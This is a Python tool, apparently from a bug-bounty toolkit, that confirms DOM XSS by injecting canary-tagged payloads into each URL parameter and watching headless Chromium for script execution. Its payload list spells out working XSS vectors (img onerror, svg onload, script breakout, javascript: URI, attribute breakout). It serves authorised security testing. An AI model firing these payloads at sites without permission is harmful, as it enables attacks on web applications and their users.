#!/usr/bin/env python3
"""
confirm_xss.py — CONFIRMS DOM XSS by driving a real headless browser, not by
reading the HTML back.

Adapted from the `dom_xss_harness.py` pattern in the AwareXone/BugHunter fork of
this project (same MIT-licensed lineage) — its core idea is exactly what's needed
here: a reflected payload in the HTML is not proof of anything. CSP, framework
auto-escaping, or a sink that never reaches eval/innerHTML can all silently
neuter it. This injects a uniquely-tagged canary payload into every parameter,
loads the page in headless Chromium, and only calls it CONFIRMED when the
browser actually fires the canary (a dialog, a hooked sink, or a console
message) — not when the marker merely shows up in the page source.

Payload generation, URL construction, and event→verdict classification are pure
and unit-testable with no browser. Only run() imports Playwright.

Usage:
  tools/confirm_xss.py "https://app.target.com/search?q=test"
  tools/confirm_xss.py "https://app.target.com/#name=x" --params q,name,redirect
  tools/confirm_xss.py URL --shot findings/target-xss/poc.png --proof findings/target-xss/proof.json
"""
from __future__ import annotations

import argparse
import sys
import uuid
from dataclasses import dataclass, asdict
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from confirm_common import CONFIRMED, POSSIBLE, UNCONFIRMED, Proof, write_proof

USER_AGENT = "claude-bug-bounty/confirm_xss"


def canary() -> str:
    """A unique, greppable marker so an execution can't be confused with
    coincidental page content. Kept short — some sinks truncate."""
    return "cbbx" + uuid.uuid4().hex[:10]


@dataclass
class Payload:
    marker: str
    param: str
    vector: str
    raw: str


def dom_payloads(param: str, marker: str) -> list[Payload]:
    """Pure: a battery of DOM-sink payloads for one injection point, each
    embedding `marker` so execution is unambiguous."""
    js = f"window.__cbbx&&window.__cbbx('{marker}');alert('{marker}')"
    return [
        Payload(marker, param, "img-onerror", f'"><img src=x onerror="{js}">'),
        Payload(marker, param, "svg-onload", f'"><svg onload="{js}">'),
        Payload(marker, param, "script-tag", f"</script><script>{js}</script>"),
        Payload(marker, param, "js-uri", f"javascript:{js}"),
        Payload(marker, param, "attr-breakout", f"' onmouseover='{js}' x='"),
    ]


def _split_fragment_params(fragment: str) -> dict[str, list[str]]:
    return parse_qs(fragment) if fragment and "=" in fragment else {}


def discover_params(url: str) -> list[str]:
    """Pure: parameter names to fuzz — query string + fragment keys."""
    parsed = urlparse(url)
    names = list(parse_qs(parsed.query).keys())
    names += [k for k in _split_fragment_params(parsed.fragment) if k not in names]
    return names


def inject(url: str, param: str, payload: str) -> str:
    """Pure: return `url` with `param` set to `payload`, preserving whether it
    lived in the query string or the fragment (both are DOM sinks)."""
    parsed = urlparse(url)
    frag_params = _split_fragment_params(parsed.fragment)
    if param in frag_params and param not in parse_qs(parsed.query):
        frag_params[param] = [payload]
        new_fragment = urlencode(frag_params, doseq=True)
        return urlunparse(parsed._replace(fragment=new_fragment))
    query = parse_qs(parsed.query)
    query[param] = [payload]
    new_query = urlencode(query, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


@dataclass
class Finding:
    url: str
    param: str
    vector: str
    marker: str
    verdict: str
    evidence: str
    screenshot: str = ""


def classify(url: str, payload: Payload, fired_markers: set[str], dom_html: str) -> Finding | None:
    """Pure: decide the verdict for one payload after the browser ran.

    CONFIRMED   — the payload's unique marker fired through an execution sink
                  (dialog / hooked window.__cbbx / console) — proven JS execution.
    POSSIBLE    — the marker is in the DOM but never executed (likely neutralized
                  by CSP/escaping — still worth a manual look, not report-ready).
    None        — no trace of the marker at all; nothing to report.
    """
    if payload.marker in fired_markers:
        return Finding(url, payload.param, payload.vector, payload.marker,
                        CONFIRMED, f"canary {payload.marker} executed via {payload.vector}")
    if payload.marker in (dom_html or ""):
        return Finding(url, payload.param, payload.vector, payload.marker,
                        POSSIBLE, f"canary {payload.marker} reflected but did not execute")
    return None


def run(url: str, params: list[str], timeout_ms: int, shot: str | None) -> list[Finding]:
    """Drive headless Chromium over every (param, payload). Lazy-imports
    Playwright so the pure core above stays importable without a browser."""
    try:
        from playwright.sync_api import sync_playwright
    except ImportError as exc:
        raise FileNotFoundError("playwright") from exc

    targets = params or discover_params(url)
    if not targets:
        raise ValueError("no parameters to test — pass --params or include ?query/#fragment in the URL")

    findings: list[Finding] = []
    with sync_playwright() as pw:
        browser = pw.chromium.launch(headless=True)
        for param in targets:
            for payload in dom_payloads(param, canary()):
                fired: set[str] = set()
                ctx = browser.new_context(user_agent=USER_AGENT, ignore_https_errors=True)
                page = ctx.new_page()
                page.expose_function("__cbbx", lambda m, _f=fired: _f.add(m))
                page.on("dialog", lambda d, _f=fired: (_f.add(d.message), d.dismiss()))
                page.on("console", lambda msg, _f=fired: _f.add(msg.text))
                target_url = inject(url, param, payload.raw)
                try:
                    page.goto(target_url, timeout=timeout_ms, wait_until="load")
                    page.wait_for_timeout(400)
                    dom_html = page.content()
                except Exception as exc:
                    dom_html = ""
                    print(f"[!] {param}/{payload.vector}: {type(exc).__name__}", file=sys.stderr)
                finding = classify(target_url, payload, fired, dom_html)
                if finding and finding.verdict == CONFIRMED and shot:
                    try:
                        page.screenshot(path=shot)
                        finding.screenshot = shot
                    except Exception:
                        pass
                if finding:
                    findings.append(finding)
                ctx.close()
        browser.close()
    return findings


def _best_verdict(findings: list[Finding]) -> tuple[str, str]:
    confirmed = [f for f in findings if f.verdict == CONFIRMED]
    if confirmed:
        f = confirmed[0]
        return CONFIRMED, f"{f.param} via {f.vector}: {f.evidence}"
    possible = [f for f in findings if f.verdict == POSSIBLE]
    if possible:
        f = possible[0]
        return POSSIBLE, f"{f.param} via {f.vector}: {f.evidence}"
    return UNCONFIRMED, "no canary reflected or executed on any parameter"


def _render(findings: list[Finding]) -> str:
    confirmed = [f for f in findings if f.verdict == CONFIRMED]
    if not findings:
        return "[-] UNCONFIRMED: no canary reflected or executed."
    lines = [f"[*] {len(confirmed)} CONFIRMED, {len(findings) - len(confirmed)} possible"]
    for f in sorted(findings, key=lambda x: 0 if x.verdict == CONFIRMED else 1):
        lines.append(f"    {f.verdict} {f.param} via {f.vector}")
        lines.append(f"            {f.url}")
    if confirmed:
        lines.append("")
        lines.append("[+] CONFIRMED = the payload actually executed in-browser. Report-ready.")
    return "\n".join(lines)


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description="Confirm DOM XSS in a real headless browser.")
    ap.add_argument("url", help="target URL (include ?query and/or #fragment to seed params)")
    ap.add_argument("--params", help="comma-separated parameter names to fuzz")
    ap.add_argument("--timeout", type=int, default=10000, help="per-page navigation timeout ms")
    ap.add_argument("--shot", help="screenshot path for the first CONFIRMED hit")
    ap.add_argument("--proof", default=None, help="write a proof.json artifact here")
    ap.add_argument("--json", action="store_true")
    args = ap.parse_args(argv)

    params = [p.strip() for p in args.params.split(",")] if args.params else []
    try:
        findings = run(args.url, params, args.timeout, args.shot)
    except FileNotFoundError:
        print("[-] Playwright is not installed.\n"
              "    pip install playwright && playwright install chromium", file=sys.stderr)
        return 127
    except ValueError as exc:
        print(f"[-] {exc}", file=sys.stderr)
        return 2

    verdict, reason = _best_verdict(findings)
    proof = Proof(
        tool="confirm_xss.py",
        vuln_class="xss",
        target_url=args.url,
        verdict=verdict,
        evidence={
            "reason": reason,
            "all_findings": [asdict(f) for f in findings],
        },
    )
    if args.proof:
        write_proof(args.proof, proof)

    if args.json:
        import json as _json
        print(_json.dumps(asdict(proof), indent=2))
    else:
        print(_render(findings))
        if args.proof:
            print(f"\n    proof written to {args.proof}")

    return 0 if verdict == CONFIRMED else 1


if __name__ == "__main__":
    raise SystemExit(main())
